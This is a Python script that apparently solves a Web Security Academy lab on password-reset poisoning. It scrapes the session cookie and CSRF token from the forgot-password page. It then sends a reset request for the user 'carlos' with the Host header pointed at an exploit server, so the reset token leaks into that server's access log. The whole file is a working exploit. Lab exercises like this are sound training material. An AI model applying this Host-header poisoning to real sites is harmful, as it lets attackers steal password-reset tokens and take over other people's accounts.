import re
import ssl
import urllib.parse
import http.client

LAB_ID = "0af4003e0467caf98138b1ee003a00c5"
EXPLOIT_SERVER_ID = "0ac3005704a8ca4f81f2b0a0010300e1"


def GET_forgotpassword() -> http.client.HTTPResponse:
    method, path = 'GET', '/forgot-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/forgot-password',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode(), headers)
    return connection.getresponse()


def POST_forgotpassword(
        session: str,
        lab: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/forgot-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'host': f"exploit-{EXPLOIT_SERVER_ID}.exploit-server.net",
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/forgot-password',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
        'Cookie': f"session={session}; _lab={lab}"
    }
    fields = {
        'username': 'carlos',
        'csrf': csrf,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def forgotpassword_csrf() -> tuple[str, str, str]:
    response = GET_forgotpassword()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    print(f"got session cookie: {session}")
    lab = re.findall(r'_lab=(.+);', cookie_header)[0]
    print(f"got _lab cookie: {lab}")
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    print(f"got csrf token: {csrf}")
    return session, lab, csrf

session, lab, csrf = forgotpassword_csrf()
response = POST_forgotpassword(session, lab, csrf)
print(response.status)
print(response.headers)
print(response.read())
if response.status == 200:
    print("Password reset link sent")
    print("find password reset link in exploit server access log")
